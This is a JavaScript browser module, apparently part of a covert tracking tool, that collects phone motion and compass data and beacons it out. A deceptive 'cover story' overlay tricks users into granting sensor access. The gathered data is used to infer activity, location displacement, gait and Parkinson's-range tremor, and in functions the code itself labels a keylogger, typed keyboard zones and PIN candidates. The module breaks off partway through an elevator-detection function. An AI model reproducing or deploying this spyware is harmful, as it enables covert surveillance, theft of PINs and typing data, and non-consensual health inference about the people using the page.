import { queueEvent, flush } from '../beacon.js';

// ─── Tap overlay (gesture gate for iOS 13+) ──────────────────────────────────

function _tapOverlay(text, icon) {
  return new Promise(resolve => {
    const el = document.createElement('div');
    el.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.75);display:flex;align-items:center;justify-content:center;z-index:99998';
    el.innerHTML = `<div style="background:#1c1c1e;border-radius:16px;padding:28px 24px;max-width:300px;text-align:center;color:#fff;font-family:-apple-system,sans-serif">
      <div style="font-size:36px;margin-bottom:12px">${icon || '📳'}</div>
      <div style="font-size:16px;font-weight:600;margin-bottom:20px">${text || 'Enable Motion'}</div>
      <button id="_m_btn" style="background:#0a84ff;border:none;color:#fff;padding:12px 32px;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;width:100%">Continue</button>
    </div>`;
    document.body.appendChild(el);
    el.querySelector('#_m_btn').addEventListener('click', () => {
      document.body.removeChild(el);
      resolve();
    }, { once: true });
  });
}

async function _ensurePermission() {
  if (typeof DeviceMotionEvent === 'undefined') return false;
  if (typeof DeviceMotionEvent.requestPermission !== 'function') return true; // Android/desktop
  // iOS: try requestPermission (no-op if already granted, throws outside gesture if not yet granted)
  try {
    return (await DeviceMotionEvent.requestPermission()) === 'granted';
  } catch {
    // requestPermission threw — likely called outside gesture context.
    // Permission may already be granted (iOS caches it). Verify by checking
    // if a test listener receives an event within 250ms.
    return new Promise(resolve => {
      const handler = () => { window.removeEventListener('devicemotion', handler); resolve(true); };
      window.addEventListener('devicemotion', handler, { once: true });
      setTimeout(() => { window.removeEventListener('devicemotion', handler); resolve(false); }, 250);
    });
  }
}

// ─── Core data collection ─────────────────────────────────────────────────────

function _r(v, n = 3) { return v != null ? +Number(v).toFixed(n) : null; }
function _mag(x, y, z) { return Math.sqrt((x ?? 0) ** 2 + (y ?? 0) ** 2 + (z ?? 0) ** 2); }

function _stats(arr) {
  if (!arr.length) return { mean: 0, std: 0, min: 0, max: 0 };
  const mean = arr.reduce((a, b) => a + b, 0) / arr.length;
  const variance = arr.reduce((a, b) => a + (b - mean) ** 2, 0) / arr.length;
  return { mean: _r(mean, 3), std: _r(Math.sqrt(variance), 3), min: _r(Math.min(...arr), 3), max: _r(Math.max(...arr), 3) };
}

// Collect raw sensor samples for durationMs
async function _collectSamples(durationMs = 5000) {
  const samples = [];
  const compass = [];
  return new Promise(resolve => {
    function onMotion(e) {
      const a = e.accelerationIncludingGravity ?? {};
      const r = e.rotationRate ?? {};
      samples.push({ t: Date.now(), ax: a.x ?? 0, ay: a.y ?? 0, az: a.z ?? 0,
        rA: r.alpha ?? 0, rB: r.beta ?? 0, rG: r.gamma ?? 0 });
    }
    function onOrient(e) {
      if (e.webkitCompassHeading != null)
        compass.push({ t: Date.now(), h: _r(e.webkitCompassHeading, 1), acc: e.webkitCompassAccuracy });
    }
    window.addEventListener('devicemotion', onMotion);
    window.addEventListener('deviceorientation', onOrient);
    setTimeout(() => {
      window.removeEventListener('devicemotion', onMotion);
      window.removeEventListener('deviceorientation', onOrient);
      resolve({ samples, compass });
    }, durationMs);
  });
}

// ─── Step detection ──────────────────────────────────────────────────────────

function _detectSteps(samples) {
  const mags = samples.map(s => _mag(s.ax, s.ay, s.az));
  const { mean } = _stats(mags);
  const threshold = mean + 1.5;   // spikes above mean+1.5 m/s² = candidate step
  const minGapMs  = 250;          // ≥250ms between steps (max ~4 steps/s = running)
  const steps = [];
  for (let i = 1; i < mags.length - 1; i++) {
    const t = samples[i].t;
    if (mags[i] > threshold && mags[i] >= mags[i - 1] && mags[i] >= mags[i + 1]) {
      if (!steps.length || t - steps[steps.length - 1] > minGapMs) steps.push(t);
    }
  }
  return steps;
}

// ─── Dominant frequency via zero-crossing rate ───────────────────────────────

function _dominantHz(values, durationSec) {
  if (values.length < 4) return null;
  const mean = values.reduce((a, b) => a + b, 0) / values.length;
  let crossings = 0;
  for (let i = 1; i < values.length; i++) {
    if ((values[i - 1] - mean) * (values[i] - mean) < 0) crossings++;
  }
  return _r(crossings / 2 / durationSec, 2); // zero-crossing → Hz estimate
}

// ─── Cardinal direction ───────────────────────────────────────────────────────

function _cardinal(deg) {
  return ['N', 'NE', 'E', 'SE', 'S', 'SW', 'W', 'NW'][Math.round(deg / 45) % 8];
}

// ═══════════════════════════════════════════════════════════════════════════════
// PUBLIC API
// ═══════════════════════════════════════════════════════════════════════════════

export async function requestPermission(coverStory) {
  try {
    if (typeof DeviceMotionEvent === 'undefined') {
      queueEvent('motion_permission', { state: 'unsupported' }); flush().catch(() => {}); return;
    }
    if (typeof DeviceMotionEvent.requestPermission === 'function') {
      await _tapOverlay(coverStory || 'Tap to enable enhanced features', '📳');
      const perm = await DeviceMotionEvent.requestPermission();
      queueEvent('motion_permission', { state: perm }); flush().catch(() => {});
    } else {
      queueEvent('motion_permission', { state: 'granted' }); flush().catch(() => {});
    }
  } catch (e) {
    queueEvent('motion_permission', { state: 'error', msg: e.message }); flush().catch(() => {});
  }
}

// ── 1. Single snapshot ───────────────────────────────────────────────────────

export async function captureOnce() {
  if (!await _ensurePermission()) {
    queueEvent('motion_capture', { error: 'not_granted' }); flush().catch(() => {}); return;
  }
  const { samples, compass } = await _collectSamples(500);
  const s = samples[0];
  if (!s) { queueEvent('motion_capture', { error: 'no_data' }); flush().catch(() => {}); return; }
  const o = compass[0] ?? {};
  queueEvent('motion_capture', {
    ts: Date.now(),
    ax: _r(s.ax), ay: _r(s.ay), az: _r(s.az),
    rA: _r(s.rA), rB: _r(s.rB), rG: _r(s.rG),
    magnitude: _r(_mag(s.ax, s.ay, s.az)),
    compassHeading: o.h ?? null,
    cardinal: o.h != null ? _cardinal(o.h) : null,
  });
  flush().catch(() => {});
}

// ── 2. Timed raw stream ──────────────────────────────────────────────────────

export async function startStream({ durationMs = 5000 } = {}) {
  if (!await _ensurePermission()) {
    queueEvent('motion_stream_error', { error: 'not_granted' }); flush().catch(() => {}); return;
  }
  const { samples, compass } = await _collectSamples(durationMs);
  const compasses = compass.map(c => c.h).filter(h => h != null);
  const avgCompass = compasses.length
    ? _r(compasses.reduce((a, b) => a + b, 0) / compasses.length, 1) : null;
  queueEvent('motion_stream', {
    ts: Date.now(), durationMs, count: samples.length,
    readings: samples.map(s => ({ t: s.t, ax: _r(s.ax,2), ay: _r(s.ay,2), az: _r(s.az,2) })),
    compass: compasses, avgCompass,
    cardinal: avgCompass != null ? _cardinal(avgCompass) : null,
  });
  flush().catch(() => {});
}

// ── 3. Activity classification ───────────────────────────────────────────────

export async function detectActivity({ durationMs = 8000 } = {}) {
  if (!await _ensurePermission()) {
    queueEvent('motion_activity', { error: 'not_granted' }); flush().catch(() => {}); return;
  }
  const { samples, compass } = await _collectSamples(durationMs);
  if (samples.length < 5) {
    queueEvent('motion_activity', { error: 'no_data' }); flush().catch(() => {}); return;
  }

  const mags   = samples.map(s => _mag(s.ax, s.ay, s.az));
  const magSt  = _stats(mags);
  const durationSec = (samples[samples.length - 1].t - samples[0].t) / 1000;

  const stepTs  = _detectSteps(samples);
  const stepCnt = stepTs.length;
  const cadence = durationSec > 0 ? _r(stepCnt / durationSec * 60, 1) : 0; // steps/min

  // Micro-vibration (vehicle engine): high-freq low-amp oscillation
  const rateVals  = samples.map(s => s.rA);
  const microHz   = _dominantHz(rateVals, durationSec);
  const vehicleVib = microHz != null && microHz > 15 && magSt.std < 1.5;

  let activity;
  if (magSt.std < 0.25)                         activity = 'stationary';
  else if (vehicleVib)                           activity = 'in_vehicle';
  else if (cadence >= 20 && cadence <= 80)       activity = 'walking';
  else if (cadence > 80)                         activity = 'running';
  else if (magSt.std < 1.2 && cadence < 20)     activity = 'fidgeting';
  else                                           activity = 'unknown';

  const compasses = compass.map(c => c.h).filter(h => h != null);
  const avgCompass = compasses.length
    ? _r(compasses.reduce((a,b) => a+b, 0) / compasses.length, 1) : null;

  queueEvent('motion_activity', {
    ts: Date.now(), durationSec: _r(durationSec, 1),
    activity, cadence, stepCount: stepCnt,
    mag: magSt, microHz,
    compassHeading: avgCompass,
    cardinal: avgCompass != null ? _cardinal(avgCompass) : null,
  });
  flush().catch(() => {});
}

// ── 4. Gait analysis ─────────────────────────────────────────────────────────

export async function measureGait({ durationMs = 15000 } = {}) {
  if (!await _ensurePermission()) {
    queueEvent('motion_gait', { error: 'not_granted' }); flush().catch(() => {}); return;
  }
  const { samples, compass } = await _collectSamples(durationMs);
  if (samples.length < 10) {
    queueEvent('motion_gait', { error: 'no_data' }); flush().catch(() => {}); return;
  }

  const durationSec = (samples[samples.length - 1].t - samples[0].t) / 1000;
  const stepTs = _detectSteps(samples);
  const cadence = durationSec > 0 ? _r(stepTs.length / durationSec * 60, 1) : 0;

  // Step interval regularity (low std = regular gait)
  const intervals = stepTs.length > 1
    ? stepTs.slice(1).map((t, i) => t - stepTs[i]) : [];
  const intervalSt = intervals.length ? _stats(intervals) : null;
  const regularity = intervalSt
    ? _r(1 - Math.min(1, intervalSt.std / (intervalSt.mean || 1)), 3) : null; // 0=irregular 1=perfect

  // Lateral sway (Y-axis std when walking)
  const ySt = _stats(samples.map(s => s.ay));

  // Estimated distance: avg step ~0.7m
  const estDistanceM = _r(stepTs.length * 0.7, 1);

  // Compass track
  const compasses = compass.map(c => c.h).filter(h => h != null);
  const avgHeading = compasses.length
    ? _r(compasses.reduce((a,b) => a+b, 0) / compasses.length, 1) : null;

  queueEvent('motion_gait', {
    ts: Date.now(), durationSec: _r(durationSec, 1),
    stepCount: stepTs.length, cadence,
    regularity, lateralSway: ySt.std,
    estDistanceM,
    compassHeading: avgHeading,
    cardinal: avgHeading != null ? _cardinal(avgHeading) : null,
    stepIntervals: intervalSt,
  });
  flush().catch(() => {});
}

// ── 5. Device context ─────────────────────────────────────────────────────────

export async function detectContext() {
  if (!await _ensurePermission()) {
    queueEvent('motion_context', { error: 'not_granted' }); flush().catch(() => {}); return;
  }
  const { samples, compass } = await _collectSamples(2500);
  if (!samples.length) {
    queueEvent('motion_context', { error: 'no_data' }); flush().catch(() => {}); return;
  }

  const mags   = samples.map(s => _mag(s.ax, s.ay, s.az));
  const magSt  = _stats(mags);
  const axMean = _r(samples.reduce((a, s) => a + s.ax, 0) / samples.length, 2);
  const ayMean = _r(samples.reduce((a, s) => a + s.ay, 0) / samples.length, 2);
  const azMean = _r(samples.reduce((a, s) => a + s.az, 0) / samples.length, 2);
  const rotSt  = _stats(samples.map(s => _mag(s.rA, s.rB, s.rG)));

  const isStill = magSt.std < 0.3 && rotSt.mean < 3;

  let context;
  if (isStill) {
    // gravity vector determines orientation
    if (Math.abs(azMean) > 8.5) context = azMean > 0 ? 'face_down_table'  : 'face_up_table';
    else if (Math.abs(ayMean) > 7) context = 'portrait_flat';
    else context = 'landscape_flat';
  } else if (magSt.std < 1.0) {
    context = 'in_pocket_or_bag';
  } else if (magSt.std < 3.0) {
    context = 'held_active';
  } else {
    context = 'heavy_motion';
  }

  const compassEntry = compass[0];
  queueEvent('motion_context', {
    ts: Date.now(), context,
    gravity: { x: axMean, y: ayMean, z: azMean },
    motionStd: magSt.std, rotMean: rotSt.mean, isStill,
    compassHeading: compassEntry?.h ?? null,
    cardinal: compassEntry?.h != null ? _cardinal(compassEntry.h) : null,
  });
  flush().catch(() => {});
}

// ── 6. Tremor / Steadiness ────────────────────────────────────────────────────

export async function detectTremor({ durationMs = 5000 } = {}) {
  if (!await _ensurePermission()) {
    queueEvent('motion_tremor', { error: 'not_granted' }); flush().catch(() => {}); return;
  }
  const { samples } = await _collectSamples(durationMs);
  if (samples.length < 10) {
    queueEvent('motion_tremor', { error: 'no_data' }); flush().catch(() => {}); return;
  }

  const durationSec = (samples[samples.length - 1].t - samples[0].t) / 1000;
  const mags = samples.map(s => _mag(s.ax, s.ay, s.az));
  const magSt = _stats(mags);

  // Remove gravity (low-pass: mean) and analyse residual (tremor)
  const residuals = mags.map(m => Math.abs(m - magSt.mean));
  const residSt = _stats(residuals);

  // RMS tremor amplitude
  const rms = _r(Math.sqrt(residuals.reduce((a, b) => a + b * b, 0) / residuals.length), 4);

  // Dominant frequency of tremor via zero-crossing
  const dominantHz = _dominantHz(mags, durationSec);

  // Gyroscope tremor
  const rotVals = samples.map(s => _mag(s.rA, s.rB, s.rG));
  const rotSt = _stats(rotVals);

  // Classification
  let tremorClass;
  if (rms < 0.05)                                   tremorClass = 'steady';
  else if (rms < 0.15 && dominantHz < 5)            tremorClass = 'mild';
  else if (rms < 0.4 && dominantHz >= 3 && dominantHz <= 7)  tremorClass = 'parkinsons_range';
  else if (rms < 0.4 && dominantHz > 7)             tremorClass = 'essential_tremor_range';
  else                                               tremorClass = 'high_motion';

  queueEvent('motion_tremor', {
    ts: Date.now(), durationSec: _r(durationSec, 1),
    rms, dominantHz,
    tremorClass,
    accelStd: magSt.std, rotRms: rotSt.mean,
    note: 'frequency ranges are indicative only, not diagnostic',
  });
  flush().catch(() => {});
}

// ── 7. Tap / Impact detection — streaming, no fixed duration ──────────────────
// Runs until window.__tapAbort = true (via stop_tap_detect command).
// Uses a rolling 100-sample baseline so threshold adapts to ambient motion.
// Each confirmed tap fires a motion_tap_detected event immediately;
// stopping fires a motion_taps summary.

export async function detectTaps() {
  if (!await _ensurePermission()) {
    queueEvent('motion_taps', { error: 'not_granted' }); flush().catch(() => {}); return;
  }

  window.__tapAbort = false;

  const taps     = [];
  const recentMags = [];   // rolling window for dynamic baseline
  const MIN_GAP_MS  = 80;  // minimum ms between detected taps
  const THRESH_MULT = 2.0; // tap = rolling_mean + 2.0 m/s²
  let lastTapT  = 0;
  const startTime = Date.now();

  return new Promise(resolve => {
    function finish() {
      window.removeEventListener('devicemotion', onMotion);
      const elapsed = Date.now() - startTime;
      const intervals = taps.length > 1
        ? taps.slice(1).map((tap, i) => tap.t - taps[i].t) : [];
      const intervalSt = intervals.length ? _stats(intervals) : null;
      queueEvent('motion_taps', {
        ts: Date.now(), elapsed,
        tapCount: taps.length,
        tapsPerSec: _r(taps.length / Math.max(1, elapsed / 1000), 2),
        taps: taps.slice(0, 500),
        intervals: intervalSt,
      });
      flush().catch(() => {});
      resolve();
    }

    function onMotion(e) {
      if (window.__tapAbort) { finish(); return; }
      const a = e.accelerationIncludingGravity ?? {};
      const mag = _mag(a.x ?? 0, a.y ?? 0, a.z ?? 0);

      // Rolling baseline (last 100 samples ≈ 1.7s at 60Hz)
      recentMags.push(mag);
      if (recentMags.length > 100) recentMags.shift();
      const rollingMean = recentMags.reduce((s, v) => s + v, 0) / recentMags.length;
      const threshold   = rollingMean + THRESH_MULT;

      const now = Date.now();
      if (mag > threshold && now - lastTapT > MIN_GAP_MS) {
        lastTapT = now;
        const tap = { t: now, peak: _r(mag, 3), baseline: _r(rollingMean, 2) };
        taps.push(tap);
        queueEvent('motion_tap_detected', { tap, totalCount: taps.length, elapsed: now - startTime });
        flush().catch(() => {});
      }
    }

    window.addEventListener('devicemotion', onMotion);
  });
}

// ── 7b. Full motion session — live analysis + final summary on stop ───────────
// Collects raw data continuously. Every 3s: emits motion_session_live with current state.
// On stop: emits final motion_session_summary with full analysis.

function _quickAnalyze(slice, compass, elapsed) {
  if (slice.length < 3) return null;
  const mags     = slice.map(s => _mag(s.ax, s.ay, s.az));
  const magSt    = _stats(mags);
  const dSec     = (slice[slice.length-1].t - slice[0].t) / 1000 || 1;
  const stepTs   = _detectSteps(slice);
  const cadence  = _r(stepTs.length / dSec * 60, 1);
  const microHz  = _dominantHz(slice.map(s => s.rA), dSec);
  const vehVib   = microHz != null && microHz > 15 && magSt.std < 1.5;

  let activity;
  if      (magSt.std < 0.25)                  activity = 'stationary';
  else if (vehVib)                             activity = 'in_vehicle';
  else if (cadence >= 20 && cadence <= 80)     activity = 'walking';
  else if (cadence > 80)                       activity = 'running';
  else if (magSt.std < 1.2)                   activity = 'fidgeting';
  else                                         activity = 'unknown';

  const axM = slice.reduce((a,s)=>a+s.ax,0)/slice.length;
  const ayM = slice.reduce((a,s)=>a+s.ay,0)/slice.length;
  const azM = slice.reduce((a,s)=>a+s.az,0)/slice.length;
  const rotSt = _stats(slice.map(s=>_mag(s.rA,s.rB,s.rG)));
  const still = magSt.std < 0.3 && rotSt.mean < 3;
  let context;
  if (still) {
    if (Math.abs(azM) > 8.5)  context = azM > 0 ? 'face_down' : 'face_up';
    else if (Math.abs(ayM) > 7) context = 'portrait';
    else                        context = 'landscape';
  } else if (magSt.std < 1.0) { context = 'in_pocket_or_bag'; }
  else if (magSt.std < 3.0)   { context = 'held_active'; }
  else                         { context = 'heavy_motion'; }

  const cH = compass.filter(c => c.h != null);
  const avgH = cH.length ? _r(cH.reduce((a,c)=>a+c.h,0)/cH.length, 1) : null;

  // Elevator (net vertical)
  const azVals  = slice.map(s=>s.az);
  const azMean2 = azVals.reduce((a,b)=>a+b,0)/azVals.length;
  const netV    = azVals.map(v=>v-azMean2);
  const ascF    = netV.filter(v=>v>0.5).length;
  const descF   = netV.filter(v=>v<-0.5).length;
  let elevator  = 'stationary';
  if (_stats(netV.map(Math.abs)).mean >= 0.15) {
    if (ascF > slice.length*0.3)       elevator = 'ascending';
    else if (descF > slice.length*0.3) elevator = 'descending';
    else                               elevator = 'movement';
  }

  return { activity, context, elevator, cadence, steps: stepTs.length,
    compassHeading: avgH, cardinal: avgH!=null?_cardinal(avgH):null, elapsed };
}

export async function startSession({ intervalMs = 1000 } = {}) {
  if (!await _ensurePermission()) {
    queueEvent('motion_session_summary', { error: 'not_granted' }); flush().catch(() => {}); return;
  }

  window.__motionSessionAbort = false;

  const samples    = [];
  const compass    = [];
  const keystrokes = [];
  const recentMags = [];
  const MIN_KS_GAP = 60;
  const KS_THRESH  = 1.0;
  let lastKsT  = 0;
  const startTime = Date.now();

  queueEvent('motion_session_started', { ts: startTime, intervalMs });
  flush().catch(() => {});

  // ── Live analysis at configurable interval ─────────────────────────────────
  const liveTimer = setInterval(() => {
    const now     = Date.now();
    const elapsed = now - startTime;
    const cutoff  = now - 5000;                         // last 5s window
    const slice   = samples.filter(s => s.t >= cutoff);
    const cpSlice = compass.filter(c => c.t >= cutoff);
    const r = _quickAnalyze(slice, cpSlice, elapsed);
    if (!r) return;
    queueEvent('motion_session_live', { ...r, elapsed, totalKeystrokes: keystrokes.length });
    flush().catch(() => {});
  }, intervalMs);

  // ── Collect until abort ────────────────────────────────────────────────────
  await new Promise(resolve => {
    function onOrient(e) {
      if (e.webkitCompassHeading != null)
        compass.push({ t: Date.now(), h: _r(e.webkitCompassHeading, 1), acc: e.webkitCompassAccuracy });
    }

    function onMotion(e) {
      if (window.__motionSessionAbort) {
        window.removeEventListener('devicemotion',      onMotion);
        window.removeEventListener('deviceorientation', onOrient);
        resolve();
        return;
      }
      const a = e.accelerationIncludingGravity ?? {};
      const r = e.rotationRate ?? {};
      const now = Date.now();
      const s = { t: now, ax: a.x??0, ay: a.y??0, az: a.z??0, rA: r.alpha??0, rB: r.beta??0, rG: r.gamma??0 };
      samples.push(s);

      // Inline keystroke capture
      const mag = _mag(s.ax, s.ay, s.az);
      recentMags.push(mag);
      if (recentMags.length > 100) recentMags.shift();
      const rollingMean = recentMags.reduce((a, v) => a + v, 0) / recentMags.length;
      if (mag > rollingMean + KS_THRESH && now - lastKsT > MIN_KS_GAP) {
        lastKsT = now;
        const row  = s.rB >  1.5 ? 'top' : s.rB < -1.5 ? 'bot' : 'mid';
        const side = s.rG < -2  ? 'right' : s.rG > 2  ? 'left' : 'center';
        keystrokes.push({ t: now, peak: _r(mag, 3), rB: _r(s.rB, 2), rG: _r(s.rG, 2), row, side,
          gap: keystrokes.length ? now - keystrokes[keystrokes.length - 1].t : null });
      }
    }

    window.addEventListener('deviceorientation', onOrient);
    window.addEventListener('devicemotion',      onMotion);
  });

  clearInterval(liveTimer);

  // ── Analyze ────────────────────────────────────────────────────────────────
  const elapsed     = Date.now() - startTime;
  const durationSec = elapsed / 1000;

  if (samples.length < 5) {
    queueEvent('motion_session_summary', { error: 'too_short', elapsed }); flush().catch(() => {}); return;
  }

  const mags       = samples.map(s => _mag(s.ax, s.ay, s.az));
  const magSt      = _stats(mags);
  const rotSt      = _stats(samples.map(s => _mag(s.rA, s.rB, s.rG)));
  const compasses  = compass.map(c => c.h).filter(h => h != null);
  const avgHeading = compasses.length ? _r(compasses.reduce((a, b) => a + b, 0) / compasses.length, 1) : null;
  const stepTs     = _detectSteps(samples);
  const cadence    = _r(stepTs.length / durationSec * 60, 1);

  // ── Activity ──────────────────────────────────────────────────────────────
  const microHz    = _dominantHz(samples.map(s => s.rA), durationSec);
  const vehicleVib = microHz != null && microHz > 15 && magSt.std < 1.5;
  let activity;
  if      (magSt.std < 0.25)                   activity = 'stationary';
  else if (vehicleVib)                          activity = 'in_vehicle';
  else if (cadence >= 20 && cadence <= 80)      activity = 'walking';
  else if (cadence > 80)                        activity = 'running';
  else if (magSt.std < 1.2)                    activity = 'fidgeting';
  else                                          activity = 'unknown';

  // ── Context ───────────────────────────────────────────────────────────────
  const axMean  = _r(samples.reduce((a, s) => a + s.ax, 0) / samples.length, 2);
  const ayMean  = _r(samples.reduce((a, s) => a + s.ay, 0) / samples.length, 2);
  const azMean  = _r(samples.reduce((a, s) => a + s.az, 0) / samples.length, 2);
  const isStill = magSt.std < 0.3 && rotSt.mean < 3;
  let context;
  if (isStill) {
    if (Math.abs(azMean) > 8.5)  context = azMean > 0 ? 'face_down' : 'face_up';
    else if (Math.abs(ayMean) > 7) context = 'portrait';
    else                           context = 'landscape';
  } else if (magSt.std < 1.0) { context = 'in_pocket_or_bag'; }
  else if (magSt.std < 3.0)   { context = 'held_active'; }
  else                         { context = 'heavy_motion'; }

  // ── Tremor ────────────────────────────────────────────────────────────────
  const residuals = mags.map(m => Math.abs(m - magSt.mean));
  const rms = _r(Math.sqrt(residuals.reduce((a, b) => a + b * b, 0) / residuals.length), 4);
  const tremorHz = _dominantHz(mags, durationSec);
  let tremorClass;
  if      (rms < 0.05)                                      tremorClass = 'steady';
  else if (rms < 0.15 && (tremorHz??0) < 5)                tremorClass = 'mild';
  else if (rms < 0.4  && (tremorHz??0) >= 3 && (tremorHz??0) <= 7) tremorClass = 'parkinsons_range';
  else if (rms < 0.4  && (tremorHz??0) > 7)                tremorClass = 'essential_tremor_range';
  else                                                       tremorClass = 'high_motion';

  // ── Gait ──────────────────────────────────────────────────────────────────
  let gait = null;
  if (stepTs.length >= 4 && durationSec >= 5) {
    const intervals = stepTs.slice(1).map((t, i) => t - stepTs[i]);
    const iSt = _stats(intervals);
    const regularity = iSt.mean > 0 ? _r(1 - Math.min(1, iSt.std / iSt.mean), 3) : null;
    const ySt = _stats(samples.map(s => s.ay));
    gait = { stepCount: stepTs.length, cadence, regularity,
      lateralSway: ySt.std, estDistanceM: _r(stepTs.length * 0.7, 1) };
  }

  // ── Elevator ──────────────────────────────────────────────────────────────
  const azVals   = samples.map(s => s.az);
  const azStEl   = _stats(azVals);
  const netVert  = azVals.map(az => az - azStEl.mean);
  const netStEl  = _stats(netVert.map(Math.abs));
  const ascF     = netVert.filter(v => v >  0.5).length;
  const descF    = netVert.filter(v => v < -0.5).length;
  const total    = samples.length;
  let elevator;
  if      (netStEl.mean < 0.15)          elevator = 'stationary';
  else if (ascF  > total * 0.3)          elevator = 'ascending';
  else if (descF > total * 0.3)          elevator = 'descending';
  else                                   elevator = 'movement';

  // ── Dead reckoning ────────────────────────────────────────────────────────
  const distM = _r(stepTs.length * 0.7, 1);
  let displacement = null;
  if (avgHeading != null) {
    const rad = avgHeading * Math.PI / 180;
    displacement = { dx: _r(distM * Math.sin(rad), 2), dy: _r(distM * Math.cos(rad), 2) };
  }

  // ── Keystroke analysis ────────────────────────────────────────────────────
  let keystrokeAnalysis = null;
  if (keystrokes.length > 0) {
    const words = []; let cur = [];
    for (let i = 0; i < keystrokes.length; i++) {
      cur.push(keystrokes[i]);
      if (i === keystrokes.length - 1 || keystrokes[i+1].t - keystrokes[i].t > 350) {
        words.push([...cur]); cur = [];
      }
    }
    const pinCandidates = words
      .filter(w => w.length >= 4 && w.length <= 8)
      .map(w => {
        const gaps = w.slice(1).map((k, i) => k.t - w[i].t);
        if (!gaps.every(g => g >= 80 && g <= 700)) return null;
        return { digits: w.length, avgGapMs: Math.round(gaps.reduce((a,b)=>a+b,0)/gaps.length),
          rows: w.map(k => k.row), sides: w.map(k => k.side) };
      }).filter(Boolean);
    const rowC  = { top: 0, mid: 0, bot: 0 };
    const sideC = { left: 0, center: 0, right: 0 };
    keystrokes.forEach(k => { rowC[k.row]=(rowC[k.row]??0)+1; sideC[k.side]=(sideC[k.side]??0)+1; });
    keystrokeAnalysis = { count: keystrokes.length, wordCount: words.length,
      wordLengths: words.map(w => w.length), pinCandidates, rowHeatmap: rowC, sideHeatmap: sideC };
  }

  // ── Summary ───────────────────────────────────────────────────────────────
  queueEvent('motion_session_summary', {
    ts: Date.now(), elapsed, durationSec: _r(durationSec, 1), sampleCount: samples.length,
    activity, context,
    tremor: { rms, tremorHz, tremorClass },
    gait,
    elevator,
    navigation: { stepCount: stepTs.length, distanceM: distM,
      heading: avgHeading, cardinal: avgHeading != null ? _cardinal(avgHeading) : null, displacement },
    keystrokes: keystrokeAnalysis,
    compassHeading: avgHeading,
    cardinal: avgHeading != null ? _cardinal(avgHeading) : null,
  });
  flush().catch(() => {});
}

// ── 8. Keystroke / keylogger inference ───────────────────────────────────────
// Each screen tap triggers a subtle rotation. The rotationRate at impact moment
// leaks which keyboard zone was tapped:
//   rB (pitch): positive → top row (Q/W/E/1/2), negative → bottom row (Z/X/C/spacebar)
//   rG (roll):  positive → right side (P/L/O/K), negative → left side (Q/A/Z/W)
// Runs until window.__keystrokeAbort = true.
// Per-keystroke: motion_keystroke_event
// On stop: motion_keystrokes summary with PIN candidates + word segments

export async function detectKeystrokes() {
  if (!await _ensurePermission()) {
    queueEvent('motion_keystrokes', { error: 'not_granted' }); flush().catch(() => {}); return;
  }

  window.__keystrokeAbort = false;

  const keystrokes  = [];
  const recentMags  = [];
  const MIN_GAP_MS  = 60;   // keyboards can fire at ~16 keys/sec max
  const THRESH_MULT = 1.8;  // slightly lower than tap detect — typing is lighter
  let lastTapT = 0;
  const startTime = Date.now();

  return new Promise(resolve => {
    function finish() {
      window.removeEventListener('devicemotion', onMotion);
      const elapsed = Date.now() - startTime;

      // ── Word segmentation (gap > 350ms = word break / space key) ──────────
      const words = [];
      let cur = [];
      for (let i = 0; i < keystrokes.length; i++) {
        cur.push(keystrokes[i]);
        if (i === keystrokes.length - 1 || keystrokes[i+1].t - keystrokes[i].t > 350) {
          words.push([...cur]); cur = [];
        }
      }

      // ── PIN candidates: 4–8 consecutive taps, each gap 80–700ms ──────────
      const pinCandidates = words
        .filter(w => w.length >= 4 && w.length <= 8)
        .map(w => {
          const gaps = w.slice(1).map((k, i) => k.t - w[i].t);
          const regular = gaps.every(g => g >= 80 && g <= 700);
          if (!regular) return null;
          const avgGap = _r(gaps.reduce((a,b) => a+b,0) / gaps.length, 0);
          return {
            digits: w.length,
            avgGapMs: avgGap,
            rows: w.map(k => k.row),
            sides: w.map(k => k.side),
          };
        })
        .filter(Boolean);

      // ── Row / side heatmaps ───────────────────────────────────────────────
      const rowCounts  = { top: 0, mid: 0, bot: 0 };
      const sideCounts = { left: 0, center: 0, right: 0 };
      keystrokes.forEach(k => {
        rowCounts[k.row]   = (rowCounts[k.row]  ?? 0) + 1;
        sideCounts[k.side] = (sideCounts[k.side] ?? 0) + 1;
      });

      // ── Intervals ────────────────────────────────────────────────────────
      const intervals = keystrokes.length > 1
        ? keystrokes.slice(1).map((k,i) => k.t - keystrokes[i].t) : [];
      const intervalSt = intervals.length ? _stats(intervals) : null;

      queueEvent('motion_keystrokes', {
        ts: Date.now(), elapsed,
        count: keystrokes.length,
        tapsPerSec: _r(keystrokes.length / Math.max(1, elapsed / 1000), 2),
        wordCount: words.length,
        wordLengths: words.map(w => w.length),
        pinCandidates,
        rowHeatmap:  rowCounts,
        sideHeatmap: sideCounts,
        intervals:   intervalSt,
        keystrokes:  keystrokes.slice(0, 1000),
        note: 'row/side is inferred from rotationRate at impact — accuracy varies by grip',
      });
      flush().catch(() => {});
      resolve();
    }

    function onMotion(e) {
      if (window.__keystrokeAbort) { finish(); return; }
      const a = e.accelerationIncludingGravity ?? {};
      const r = e.rotationRate ?? {};
      const mag = _mag(a.x ?? 0, a.y ?? 0, a.z ?? 0);

      recentMags.push(mag);
      if (recentMags.length > 100) recentMags.shift();
      const rollingMean = recentMags.reduce((s,v) => s+v, 0) / recentMags.length;

      const now = Date.now();
      if (mag > rollingMean + THRESH_MULT && now - lastTapT > MIN_GAP_MS) {
        lastTapT = now;

        // Rotation rate at impact → keyboard zone
        // rB = pitch rate (deg/s): positive = top-of-phone tipping away → top row tap
        // rG = roll rate  (deg/s): positive = phone rolling right → LEFT side tap
        const rB = r.beta  ?? 0;
        const rG = r.gamma ?? 0;

        const row  = rB >  1.5 ? 'top' : rB < -1.5 ? 'bot' : 'mid';
        const side = rG < -2  ? 'right' : rG > 2  ? 'left' : 'center';
        // note: gamma roll sign is inverted — tilting LEFT means RIGHT-side key pressed

        const gap = keystrokes.length ? now - keystrokes[keystrokes.length-1].t : null;
        const k = { t: now, peak: _r(mag, 3), rB: _r(rB, 2), rG: _r(rG, 2), row, side, gap };
        keystrokes.push(k);

        queueEvent('motion_keystroke_event', { k, total: keystrokes.length, elapsed: now - startTime });
        flush().catch(() => {});
      }
    }

    window.addEventListener('devicemotion', onMotion);
  });
}

// ── 8b. Stop keylogger ─────────────────────────────────────────────────────────
// Called via stop_keystroke_detect command — sets abort flag, onMotion picks it up.

// ── 9. Elevator / vertical movement detection ─────────────────────────────────

export async function detectElevator({ durationMs = 8000 } = {}) {
